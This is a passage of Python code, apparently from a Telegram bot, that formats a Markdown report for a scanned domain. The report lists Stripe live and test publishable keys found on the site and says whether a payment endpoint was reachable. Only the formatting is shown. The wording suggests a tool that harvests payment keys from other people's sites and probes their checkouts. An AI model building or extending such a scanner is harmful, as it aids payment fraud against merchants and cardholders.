            text += f"\n\n🔑 **All Live Keys ({len(result.pk_live_keys)}):**\n{live_key_text}"

    # ── Key found but no endpoint ─────────────────────────────────────────────
    else:
        s_icon     = "🔑" if result.pk_live_keys else "⚠️"
        error_note = (result.error or "No accessible payment endpoint found")[:120]
        text = (
            f"{s_icon} **Stripe Key Found — Endpoint Protected**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 **Domain:** `{domain}`\n"
            f"{t_icon} **Site Type:** `{site_type}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
        )
        if result.pk_live_keys:
            text += f"✅ **Live Keys ({len(result.pk_live_keys)}):**\n{live_key_text}"
        if result.pk_test_keys:
            text += f"⚠️ **Test Keys:**\n{test_key_text}"
        text += (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❌ `{error_note}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{stats}"
        )

    await msg.edit_text(text, parse_mode=enums.ParseMode.MARKDOWN)
